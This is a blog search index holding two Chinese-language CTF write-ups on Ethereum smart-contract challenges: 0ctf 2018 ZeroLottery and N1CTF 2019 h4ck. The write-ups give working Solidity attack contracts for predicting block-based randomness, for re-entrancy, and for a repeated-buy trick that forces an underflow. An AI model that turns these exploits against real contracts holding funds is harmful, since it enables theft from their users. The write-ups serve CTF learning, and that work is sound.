<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Randomness(1)-0ctf_2018_ZeroLottery</title>
    <link href="/2022/09/08/2022-9-8-Randomness(1)/"/>
    <url>/2022/09/08/2022-9-8-Randomness(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="Randomness（1）"><a href="#Randomness（1）" class="headerlink" title="Randomness（1）"></a>Randomness（1）</h1><p><a href="https://www.freebuf.com/vuls/179173.html">随机数类型</a></p><p><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/randomness/#_3">wiki部分</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/115668771">wp1</a></p><h2 id="0ctf-2018-ZeroLottery"><a href="#0ctf-2018-ZeroLottery" class="headerlink" title="0ctf 2018 ZeroLottery"></a>0ctf 2018 ZeroLottery</h2><p>题目最终需要我们做到的是</p><blockquote><p>Your goal is make your ZeroLottery’s balance &gt; 500</p></blockquote><p>题目源码</p><figure class="highlight zephir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs zephir">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.21</span>;<br>contract ZeroLottery &#123;<br>    struct SeedComponents &#123;<br>        <span class="hljs-keyword">uint</span> component1;<br>        <span class="hljs-keyword">uint</span> component2;<br>        <span class="hljs-keyword">uint</span> component3;<br>        <span class="hljs-keyword">uint</span> component4;<br>    &#125;<br><br>    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">private</span> base = <span class="hljs-number">8</span>;<br><br>    address <span class="hljs-keyword">private</span> owner;<br>    mapping (address =&gt; uint256) <span class="hljs-keyword">public</span> balanceOf;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ZeroLottery</span><span class="hljs-params">()</span> <span class="hljs-title">public</span> </span>&#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>&#123;<br>        balanceOf[msg.sender] = <span class="hljs-number">100</span>;   <span class="hljs-comment">//初始化，初始金额100</span><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bet</span><span class="hljs-params">(<span class="hljs-keyword">uint</span> guess)</span> <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>&#123;<br>        <span class="hljs-keyword">require</span>(msg.value&gt;<span class="hljs-number">1</span> ether);<br>        <span class="hljs-keyword">require</span>(balanceOf[msg.sender] &gt; <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// uint secretSeed = seed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));</span><br>        <span class="hljs-keyword">uint</span> secretSeed =  uint256(keccak256(<br>            (<span class="hljs-keyword">uint</span>)(block.coinbase),<br>            block.difficulty,<br>            block.gaslimit,<br>            block.timestamp<br>        ));<br>        <span class="hljs-keyword">uint</span> n = <span class="hljs-keyword">uint</span>(keccak256(<span class="hljs-keyword">uint</span>(msg.sender), secretSeed)) % base;<br>        <span class="hljs-keyword">if</span> (guess != n) &#123;<br>            balanceOf[msg.sender] = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">// charge 0.5 ether for failure</span><br>            msg.sender.transfer(msg.value - <span class="hljs-number">0.5</span> ether);<span class="hljs-comment">//猜错了，扣0.5 ether.</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// charge 1 ether for success</span><br>        msg.sender.transfer(msg.value - <span class="hljs-number">1</span> ether); <span class="hljs-comment">// 猜对了，1 ether换balance100</span><br>        balanceOf[msg.sender] = balanceOf[msg.sender] + <span class="hljs-number">100</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">paolu</span><span class="hljs-params">()</span> <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>&#123;<br>        <span class="hljs-keyword">require</span>(msg.sender == owner);<br>        selfdestruct(owner);<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>不怎么需要分析就是单纯的随机数预测，题目使用区块变量来生成了伪随机数，所以我们部署第三方合约调用函数时用同样的方法计算seed生成出来的随机数是一样的，因为此时两合约打包在一个区块中，所以所使用到的区块变量都是一样的。</p><p>攻击合约.</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.21</span>;<br><br>import <span class="hljs-string">&quot;./source.sol&quot;</span>;<br>contract exp &#123;<br>    address constance = address(<span class="hljs-number">0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8</span>);<br>    ZeroLottery target = ZeroLottery(constance);<br>    constructor() payable <span class="hljs-keyword">public</span>&#123;<br>        <br>    &#125;<br>    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">base</span> = <span class="hljs-number">8</span>;<br><br>    <span class="hljs-function">function <span class="hljs-title">betSucess</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> payable</span>&#123;<br>        <span class="hljs-built_in">uint</span> secretSeed = uint256(keccak256(<br>            (<span class="hljs-built_in">uint</span>)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp<br>        ));<br>        <span class="hljs-built_in">uint</span> n = <span class="hljs-built_in">uint</span>(keccak256(<span class="hljs-built_in">uint</span>(<span class="hljs-keyword">this</span>), secretSeed)) % <span class="hljs-keyword">base</span>;<br>        target.bet.<span class="hljs-keyword">value</span>(<span class="hljs-number">1.1</span> ether)(n);<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> target.balanceOf(address(<span class="hljs-keyword">this</span>));<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">InitBalance</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span></span> &#123;<br>        target.<span class="hljs-keyword">init</span>();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>初始化一次。然后调用四次<code>betSucess</code>即可。还有一种回滚攻击看看wp吧，很容易理解。<br><img src="https://img-blog.csdnimg.cn/img_convert/a4ce530f554f40876bb094770281e1bc.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re-Entrancy(2)-N1CTF2019_h4ck</title>
    <link href="/2022/09/08/2022-9-8-Re-Entrancy(2)/"/>
    <url>/2022/09/08/2022-9-8-Re-Entrancy(2)/</url>
    
    <content type="html"><![CDATA[<h1 id="Re-Entrancy-2"><a href="#Re-Entrancy-2" class="headerlink" title="Re-Entrancy(2)"></a>Re-Entrancy(2)</h1><p><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/#2019">wiki部分</a></p><p>什么是重入攻击</p><blockquote><p>假设有两个合约A和合约B，合约A调用合约B。在这种攻击中，当第一个调用仍在执行时，合约B调用合约A，这在某种程度上导致了一个循环。</p></blockquote><p>每当我们将以太坊发送到智能合约地址时，我们都会调用我们所说的fallback函数。</p><p><a href="https://hitcxy.com/2019/h4ck/">wp</a></p><h2 id="N1CTF-2019-h4ck"><a href="#N1CTF-2019-h4ck" class="headerlink" title="N1CTF 2019 h4ck"></a>N1CTF 2019 h4ck</h2><p>题目合约0xB616eBC25E1E9Cfbf6C82Ab66888926bfB0101a6<br>攻击合约0x8Ebd3958CeA078271cce190b6be6e2d73c37a1A2<br>源码</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">pragma solidity ^<span class="hljs-number">0.4</span>.<span class="hljs-number">25</span>;<br><br>contract owned &#123;<br>    address public owner;<br><br>    constructor <span class="hljs-literal">()</span> <br>        public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    modifier onlyOwner &#123;<br>        require(msg.sender<span class="hljs-operator"> == </span>owner);<br>        _;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> transfer<span class="hljs-constructor">Ownership(<span class="hljs-params">address</span> <span class="hljs-params">newOwner</span>)</span> public <br>        onlyOwner &#123;<br>        owner = newOwner;<br>    &#125;<br>&#125;<br><br>contract challenge is owned&#123;<br>    <br>    <span class="hljs-built_in">string</span> public name;<br>    <span class="hljs-built_in">string</span> public symbol;<br>    uint8 public decimals = <span class="hljs-number">18</span>;<br>    uint256 public totalSupply;<br><br>    mapping (address =&gt; uint256) public balanceOf;<br>    mapping (address =&gt; uint256) public sellTimes;<br>    mapping (address =&gt; mapping (address =&gt; uint256)) public allowance;<br>    mapping (address =&gt; <span class="hljs-built_in">bool</span>) public winner;<br><br>    event <span class="hljs-constructor">Transfer(<span class="hljs-params">address</span> <span class="hljs-params">_from</span>, <span class="hljs-params">address</span> <span class="hljs-params">_to</span>, <span class="hljs-params">uint256</span> <span class="hljs-params">_value</span>)</span>;<br>    event <span class="hljs-constructor">Burn(<span class="hljs-params">address</span> <span class="hljs-params">_from</span>, <span class="hljs-params">uint256</span> <span class="hljs-params">_value</span>)</span>;<br>    event <span class="hljs-constructor">Win(<span class="hljs-params">address</span> <span class="hljs-params">_address</span>,<span class="hljs-params">bool</span> <span class="hljs-params">_win</span>)</span>;<br><br><br>    constructor (<br>        uint256 initialSupply,<br>        <span class="hljs-built_in">string</span> tokenName,<br>        <span class="hljs-built_in">string</span> tokenSymbol<br>    ) public  &#123;<br>        totalSupply = initialSupply<span class="hljs-operator"> * </span><span class="hljs-number">10</span><span class="hljs-operator"> ** </span>uint256(decimals);  <br>        balanceOf<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> = totalSupply;                <br>        name = tokenName;                                   <br>        symbol = tokenSymbol;                               <br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-constructor">_transfer(<span class="hljs-params">address</span> <span class="hljs-params">_from</span>, <span class="hljs-params">address</span> <span class="hljs-params">_to</span>, <span class="hljs-params">uint</span> <span class="hljs-params">_value</span>)</span> internal &#123;<br>        require(_to != address(<span class="hljs-number">0x0</span>));<br>        require(_value &gt; <span class="hljs-number">0</span>);<br>        <br>        uint256 oldFromBalance = balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_from</span>]</span>;<br>        uint256 oldToBalance = balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_to</span>]</span>;<br>        <br>        uint256 newFromBalance =  balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_from</span>]</span> - _value;<br>        uint256 newToBalance =  balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_to</span>]</span> + _value;<br>        <br>        require(oldFromBalance &gt;= _value);<br>        require(newToBalance &gt; oldToBalance);<br>        <br>        balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_from</span>]</span> = newFromBalance;<br>        balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_to</span>]</span> = newToBalance;<br>        <br>        <span class="hljs-keyword">assert</span>((oldFromBalance + oldToBalance)<span class="hljs-operator"> == </span>(newFromBalance + newToBalance));<br>        emit <span class="hljs-constructor">Transfer(<span class="hljs-params">_from</span>, <span class="hljs-params">_to</span>, <span class="hljs-params">_value</span>)</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> transfer(address _to, uint256 _value) public returns (<span class="hljs-built_in">bool</span> success) &#123;<br>        <span class="hljs-constructor">_transfer(<span class="hljs-params">msg</span>.<span class="hljs-params">sender</span>, <span class="hljs-params">_to</span>, <span class="hljs-params">_value</span>)</span>; <br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> transfer<span class="hljs-constructor">From(<span class="hljs-params">address</span> <span class="hljs-params">_from</span>, <span class="hljs-params">address</span> <span class="hljs-params">_to</span>, <span class="hljs-params">uint256</span> <span class="hljs-params">_value</span>)</span> public returns (<span class="hljs-built_in">bool</span> success) &#123;<br>        require(_value &lt;= allowance<span class="hljs-literal">[<span class="hljs-identifier">_from</span>]</span><span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span>);    <br>        allowance<span class="hljs-literal">[<span class="hljs-identifier">_from</span>]</span><span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> -= _value;<br>        <span class="hljs-constructor">_transfer(<span class="hljs-params">_from</span>, <span class="hljs-params">_to</span>, <span class="hljs-params">_value</span>)</span>;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> approve(address _spender, uint256 _value) public returns (<span class="hljs-built_in">bool</span> success) &#123;<br>        allowance<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span><span class="hljs-literal">[<span class="hljs-identifier">_spender</span>]</span> = _value;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> burn(uint256 _value) public returns (<span class="hljs-built_in">bool</span> success) &#123;<br>        require(balanceOf<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> &gt;= _value);<br>        balanceOf<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> -= _value;<br>        totalSupply -= _value;          <br>        emit <span class="hljs-constructor">Burn(<span class="hljs-params">msg</span>.<span class="hljs-params">sender</span>, <span class="hljs-params">_value</span>)</span>;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> balance<span class="hljs-constructor">Of(<span class="hljs-params">address</span> <span class="hljs-params">_address</span>)</span> public view returns (uint256 balance) &#123;<br>        return balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_address</span>]</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> buy<span class="hljs-literal">()</span> payable public returns (<span class="hljs-built_in">bool</span> success)&#123;<br>        require(balanceOf<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span>==<span class="hljs-number">0</span>);<br>        require(msg.value<span class="hljs-operator"> == </span><span class="hljs-number">1</span> wei);<br>        <span class="hljs-constructor">_transfer(<span class="hljs-params">address</span>(<span class="hljs-params">this</span>)</span>, msg.sender, <span class="hljs-number">1</span>);<br>        sellTimes<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> = <span class="hljs-number">1</span>;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>    <br>    <span class="hljs-keyword">function</span> sell(uint256 _amount) public returns (<span class="hljs-built_in">bool</span> success)&#123;<br>        require(_amount &gt;= <span class="hljs-number">100</span>);<br>        require(sellTimes<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> &gt; <span class="hljs-number">0</span>);<br>        require(balanceOf<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> &gt;= _amount);<br>        require(address(this).balance &gt;= _amount);<br>        msg.sender.call.value(_amount)<span class="hljs-literal">()</span>;<br>        <span class="hljs-constructor">_transfer(<span class="hljs-params">msg</span>.<span class="hljs-params">sender</span>, <span class="hljs-params">address</span>(<span class="hljs-params">this</span>)</span>, _amount);<br>        sellTimes<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> -= <span class="hljs-number">1</span>;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> winner<span class="hljs-constructor">Submit()</span> public returns (<span class="hljs-built_in">bool</span> success)&#123;<br>        require(winner<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span><span class="hljs-operator"> == </span><span class="hljs-literal">false</span>);<br>        require(sellTimes<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> &gt; <span class="hljs-number">100</span>);<br>        winner<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> = <span class="hljs-literal">true</span>;<br>        emit <span class="hljs-constructor">Win(<span class="hljs-params">msg</span>.<span class="hljs-params">sender</span>,<span class="hljs-params">true</span>)</span>;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> kill(address _address) public onlyOwner &#123;<br>        selfdestruct(_address);<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> eth<span class="hljs-constructor">_balance()</span> public view returns (uint256 ethBalance)&#123;<br>        return address(this).balance;<br>    &#125;<br>    <br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>最终目的是调用到<code>winnerSubmit</code>函数，但它有两个<code>require</code>限制。第一个限制本来就是满足的，主要是第二个限制条件需要达到。</p><figure class="highlight coffeescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-built_in">require</span>(winner[msg.sender] == <span class="hljs-literal">false</span>);<br><span class="hljs-built_in">require</span>(sellTimes[msg.sender] &gt; <span class="hljs-number">100</span>);<br></code></pre></div></td></tr></table></figure><p>在<code>sell</code>和<code>buy</code>函数中都有对sellTimes增加的操作。<br><code>buy</code>函数中存在薅羊毛攻击，同时要求每次调用时传1 wei，然后让sellTimes[msg.sender] = 1。</p><p><code>sell</code>函数中明显存在一个重入攻击，但有四个条件限制。限制了如下操作：</p><ul><li>限制了调用函数时参数amount&gt;=100</li><li>sellTimes[msg.sender] &gt; 0 可以先调用buy即可</li><li>这个限制可以先通过第三方攻击合约薅羊毛攻击然后调用transfer转账给攻击账户即可</li><li>题目合约的balance本身就是很大的。</li></ul><p>达到条件后最后会进行sellTimes[msg.sender] -= 1;操作，这里很明显存在溢出，溢出之后就能达到winnerSubmit函数的第二个条件了。</p><figure class="highlight coffeescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-built_in">require</span>(_amount &gt;= <span class="hljs-number">100</span>);<br><span class="hljs-built_in">require</span>(sellTimes[msg.sender] &gt; <span class="hljs-number">0</span>);<br><span class="hljs-built_in">require</span>(balanceOf[msg.sender] &gt;= _amount);<br><span class="hljs-built_in">require</span>(address(<span class="hljs-built_in">this</span>).balance &gt;= _amount);<br></code></pre></div></td></tr></table></figure><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>部署攻击合约,攻击合约需要先调用一次<code>buy1</code></p><figure class="highlight zephir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs zephir"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.24</span>;<br><br>import <span class="hljs-string">&quot;./source.sol&quot;</span>;<br>contract exp &#123;<br>    <br>    address instance_address = <span class="hljs-number">0xB616eBC25E1E9Cfbf6C82Ab66888926bfB0101a6</span>;<br>    challenge target = challenge(instance_address);<br>    <span class="hljs-keyword">bool</span> status = <span class="hljs-keyword">false</span>;<br>    <span class="hljs-keyword">uint</span> have_withdraw = <span class="hljs-number">3</span>;<br>    constructor() payable &#123;<br>        <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy1</span><span class="hljs-params">()</span></span>&#123;<br>        target.buy.value(<span class="hljs-number">1</span>)();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pay</span><span class="hljs-params">()</span> <span class="hljs-title">public</span> </span>&#123;<br>        <span class="hljs-comment">// withdraw</span><br>        <span class="hljs-keyword">if</span>(have_withdraw &gt;= <span class="hljs-number">0</span> )&#123;<br>            target.sell(<span class="hljs-keyword">uint</span>(<span class="hljs-number">100</span>));<br>            have_withdraw = have_withdraw <span class="hljs-number">-1</span> ;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span><span class="hljs-params">()</span></span>&#123;<br>        target.winnerSubmit();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span> <span class="hljs-title">payable</span> </span>&#123;<br>        target.sell(<span class="hljs-keyword">uint</span>(<span class="hljs-number">100</span>));<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>部署薅羊毛合约</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">// SPDX-License-Identifier: MIT<br><span class="hljs-keyword">pragma</span> solidity ^<span class="hljs-number">0.4</span>.<span class="hljs-number">24</span>;<br><br>import <span class="hljs-string">&quot;./source.sol&quot;</span>;<br>contract Hunting &#123;<br>    address instance_address = <span class="hljs-number">0</span>xB616eBC25E1E9Cfbf6C82Ab66888926bfB0101a6;<br>    challenge target = challenge(instance_address);<br><br>    constructor() payable &#123;<br>        <br>    &#125;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title">buy1</span>()  payable&#123;<br>        target.buy.value(1)();<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title">transfer1</span>()   &#123;<br>        target.transfer(address(0x8Ebd3958CeA078271cce190b6be6e2d73c37a1A2)  , 1);<br>    &#125;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title">Hunt</span>()    &#123;<br>        for ( int i = 0; i &lt; 100 ; i++)&#123;<br>            buy1();<br>            transfer1();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title">get</span>() public view returns (uint256 balance) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-type">address(this).balance</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>() public view returns (uint256 balance) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-type">target.balanceOf(address(this))</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>调用hunt函数，调用三次能让balance+300以便重入攻击的次数足够让sellTimes溢出<br><img src="https://img-blog.csdnimg.cn/img_convert/9bac7b300bd25750fb5168b4535502aa.png"></p><p>此时攻击合约的balance应该是301.<br><img src="https://img-blog.csdnimg.cn/img_convert/f81de952d8568d55d1fc18173b671081.png"></p><p>然后调用攻击合约的pay函数继续重入攻击，可以看到此时已经溢出<br><img src="https://img-blog.csdnimg.cn/img_convert/af31c8e8db6b9d16951517d222f6cbf9.png"></p><p>最后调用getflag即可，查看题目合约的events即可看到调用成功。<br><img src="https://img-blog.csdnimg.cn/2b2fe0193bdf4184b5d2e61f5cdde6fb.png"></p><h2 id="总结"><a href="#总结" 